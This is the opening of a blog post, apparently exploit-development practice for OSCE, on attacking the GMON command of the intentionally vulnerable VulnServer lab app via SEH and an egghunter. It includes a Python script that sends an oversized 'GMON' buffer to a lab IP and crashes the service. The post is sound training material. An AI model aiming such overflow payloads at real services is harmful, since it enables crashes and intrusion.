---
layout: post
title:  "[VulnServer] Exploiting GMON Command via SEH and Egghunter"
date:   2018-06-30
categories: [exploitdev, osceprep]
---

I used the following skeleton to exploit the `GMON` command.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()
```

Executing this code caused a crash to the application. As observed, **EIP** was not overwritten with A’s. So, what caused the crash?
![Crash](/static/img/05/01.png)
